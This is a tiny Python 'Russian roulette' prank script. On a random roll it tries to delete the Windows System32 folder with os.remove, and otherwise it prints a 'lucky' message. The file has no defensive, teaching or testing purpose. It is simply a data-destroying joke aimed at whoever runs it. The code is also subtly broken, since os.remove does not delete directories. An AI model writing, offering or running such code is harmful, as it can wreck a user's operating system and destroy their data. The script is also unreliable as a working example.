import os, random 

missile_in_chamber = random.randint(0, 6)

if missile_in_chamber == 3:
    os.remove("C:\\Windows\\System32")
else:
    print("You are lucky :D")